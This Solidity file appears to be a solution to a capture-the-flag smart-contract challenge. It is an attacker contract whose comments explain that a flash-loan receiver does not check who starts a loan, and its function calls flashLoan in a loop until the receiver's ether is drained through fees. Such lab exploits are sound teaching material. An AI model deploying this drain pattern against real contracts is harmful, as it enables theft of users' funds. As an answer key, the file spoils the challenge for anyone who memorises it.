// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FlashLoanReceiver} from "./FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    // Observation:
    // we can only transfer out of the receiver contract using the onFlashLoan function
    // it relies on checking the slot to validate the pool address
    // it doesnt check for origin though, so anyone could designate it as receiver and drain through fees
    //
    // Plan:
    // we call flashLoan until receiver is drained
    function attack(NaiveReceiverLenderPool pool, FlashLoanReceiver receiver) external {
        while (address(receiver).balance > 0) {
            pool.flashLoan(receiver, ETH, 0, "");
        }
    }
}
